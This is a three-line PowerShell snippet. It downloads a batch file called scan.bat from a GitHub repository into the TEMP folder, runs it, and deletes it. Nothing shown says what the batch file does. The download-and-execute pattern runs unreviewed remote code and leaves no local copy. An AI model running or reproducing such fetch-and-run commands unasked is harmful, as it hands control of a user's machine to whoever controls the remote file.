Invoke-WebRequest "https://raw.githubusercontent.com/tameval/dev/main/macro/scan.bat" -OutFile $env:TEMP\scan.bat
Start-Process -Wait $env:TEMP\scan.bat
Remove-Item $env:TEMP\scan.bat
